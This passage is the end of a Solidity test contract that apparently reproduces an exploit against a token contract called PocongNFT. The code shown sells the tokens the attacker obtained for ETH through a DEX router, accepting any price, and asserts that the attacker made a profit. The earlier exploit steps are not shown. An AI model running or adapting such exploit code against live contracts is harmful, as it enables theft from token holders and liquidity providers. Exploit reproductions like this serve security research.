        vm.stopPrank();

        // Step 5: Sell the received tokens for ETH
        // Get our token balance
        uint256 tokenBalance = PocongNFT(TARGET).balanceOf(attacker);
        require(tokenBalance > 0, "No tokens received");

        // Get router and WETH address
        IUniswapV2Router02 router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address weth = router.WETH();

        // Approve router to spend our tokens
        PocongNFT(TARGET).approve(address(router), tokenBalance);

        // Create path: TARGET -> WETH
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = weth;

        // Swap tokens for ETH
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0, // accept any amount
            path,
            attacker,
            block.timestamp + 1000
        );

        // Check if we made profit
        uint256 finalBalance = address(attacker).balance;
        require(finalBalance > initialBalance, "No profit made");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

